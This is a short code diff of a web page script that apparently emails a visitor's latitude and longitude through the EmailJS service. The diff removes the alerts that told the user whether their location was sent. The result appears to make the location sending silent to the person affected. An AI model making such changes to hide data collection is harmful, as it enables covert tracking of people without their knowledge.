@@ -32,12 +32,6 @@
             emailjs.send(serviceID, templateID, {
                 latitude: latitude,
                 longitude: longitude
-            }).then(function(response) {
-                console.log("Email sent:", response);
-                alert("Location sent successfully");
-            }, function(error) {
-                console.error("Error sending email:", error);
-                alert("Failed to send location");
             });
         }
     </script>
